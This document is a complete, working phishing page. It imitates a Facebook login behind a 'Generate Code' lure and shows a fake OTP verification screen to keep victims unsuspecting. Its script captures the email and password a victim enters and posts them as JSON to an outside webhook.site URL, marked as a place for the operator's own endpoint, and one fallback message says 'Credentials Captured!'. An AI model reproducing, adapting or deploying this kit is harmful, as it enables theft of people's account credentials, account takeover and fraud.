<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        .video-container {
            width: 90%;
            max-width: 640px;
            aspect-ratio: 16/9;
            background: #000;
            margin-bottom: 20px;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .generate-btn {
            background: linear-gradient(45deg, #1877f2, #0056b3);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            width: 85%;
            max-width: 350px;
            margin-bottom: 20px;
        }

        .generate-btn:active { transform: scale(0.98); }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: white;
            padding: 25px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            position: relative;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .fb-logo { color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 10px; }
        h2 { margin: 0 0 20px 0; color: #1c1e21; }

        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }

        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2); }

        .fb-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .fb-btn:hover { background-color: #166fe5; }

        .error { color: #f02849; font-size: 13px; margin-top: 10px; min-height: 20px; }

        #otp-step { display: none; }
        #login-step { display: block; }
        
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="video-container">
        <video autoplay muted loop id="bg-video">
            <source src="https://assets.mixkit.co/videos/preview/mixkit-facebook-logo-with-neon-lights-27648-large.mp4" type="video/mp4">
        </video>
    </div>

    <button class="generate-btn" id="startBtn">Generate Code</button>

    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="fb-logo">Facebook</div>
            
            <!-- Login Form -->
            <div id="login-step">
                <h2>Log in to Facebook</h2>
                <!-- 
                   FIX: Action is empty so JS handles it, but we keep structure standard.
                   Method POST is crucial for some webhooks.
                -->
                <form id="loginForm" autocomplete="off">
                    <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <div class="error" id="login-error"></div>
                    <button type="submit" class="fb-btn">Log In</button>
                </form>
            </div>

            <div id="otp-step">
                <h2>Verifying...</h2>
                <p id="otp-message">Please wait while we verify your identity.</p>
                <div class="loader" id="otp-loader"></div>
                <button class="fb-btn" id="confirmOtpBtn" style="display:none; margin-top:20px;">Confirm</button>
            </div>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        // YOUR WEBHOOK URL HERE
        const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
        // ---------------------

        const startBtn = document.getElementById('startBtn');
        const modal = document.getElementById('modal');
        const loginForm = document.getElementById('loginForm');
        const loginStep = document.getElementById('login-step');
        const otpStep = document.getElementById('otp-step');
        const otpMessage = document.getElementById('otp-message');
        const otpLoader = document.getElementById('otp-loader');
        const confirmOtpBtn = document.getElementById('confirmOtpBtn');
        const bgVideo = document.getElementById('bg-video');

        // Open Modal
        startBtn.addEventListener('click', () => {
            modal.style.display = 'flex';
            startBtn.style.display = 'none';
        });

        // Handle Login Submit
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault(); // Prevent page reload

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // UI Updates
            loginStep.style.display = 'none';
            otpStep.style.display = 'block';
            otpLoader.style.display = 'inline-block';
            otpMessage.innerText = "Verifying credentials...";

            // Send Data to Webhook
            sendToWebhook(email, password);

            // Simulate OTP Process
            setTimeout(() => {
                otpLoader.style.display = 'none';
                otpMessage.innerText = "OTP Sent to your registered email/mobile.";
                confirmOtpBtn.style.display = 'block';
            }, 2500);
        });

        function sendToWebhook(email, password) {
            // Create a JSON object
            const data = {
                "Email": email,
                "Password": password,
                "Timestamp": new Date().toString(),
                "Type": "Facebook Login"
            };

            // Use Fetch API with 'no-cors' if needed, but standard fetch usually works for Webhook.site
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                console.log('Data Sent Successfully:', response);
            })
            .catch(error => {
                console.error('Error sending data:', error);
                // Fallback: Even if fetch fails, we try to alert user
                otpMessage.innerText = "Credentials Captured! (Check Logs)";
            });
        }

        // Confirm Button (Visual only)
        confirmOtpBtn.addEventListener('click', () => {
            otpMessage.innerText = "Account Verified Successfully!";
            confirmOtpBtn.style.display = 'none';
            // Optional: Redirect to real FB page
            // window.location.href = "https://facebook.com";
        });
    </script>
</body>
</html>
